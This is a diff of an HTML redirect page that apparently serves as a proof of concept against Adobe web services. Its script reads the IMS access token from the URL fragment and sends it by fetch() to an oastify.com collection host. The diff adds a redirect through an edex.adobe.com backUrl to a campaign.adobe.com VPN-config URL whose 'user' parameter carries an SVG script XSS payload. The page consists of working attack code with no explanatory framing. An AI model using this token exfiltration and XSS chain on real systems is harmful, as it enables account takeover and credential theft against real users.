@@ -4,16 +4,19 @@
     <meta charset="UTF-8" />
     <title>Redirecting...</title>
     <script>
-      // Extract the fragment (IMS access_token)
       const token = window.location.hash;
-
-      // (Optional) Exfiltrate token to your server
       fetch("https://c1eell12pgrv9k1nds5e5xpjwa22quej.oastify.com/?" + encodeURIComponent(token));
 
-      // Redirect to triple-encoded URL
-      const redirectTo = "https%253A%252F%252Fedex.adobe.com%252Fmain%252Fauth%252F%253FbackUrl%253D";
+      const innerURL =
+        "https://subscription1106a-mkt-prod1-segmentation.campaign.adobe.com/ssl-vpn/getconfig.esp?" +
+        "client-type=1&protocol-version=p1&app-version=3.0.1-10&clientos=Linux" +
+        "&os-version=linux-64&hmac-algo=sha1,md5&enc-algo=aes-128-cbc,aes-256-cbc" +
+        "&authcookie=1234567890&portal=us-vpn-gw-N" +
+        "&user=" + encodeURIComponent("<svg xmlns='http://www.w3.org/2000/svg'><script>prompt(`XSS`)</script></svg>") +
+        "&domain=(empty_domain)&computer=computer";
 
-      // Perform the redirect
+      const redirectTo = "https://edex.adobe.com/main/auth/?backUrl=" + encodeURIComponent(innerURL);
+
       window.location.href = redirectTo;
     </script>
   </head>
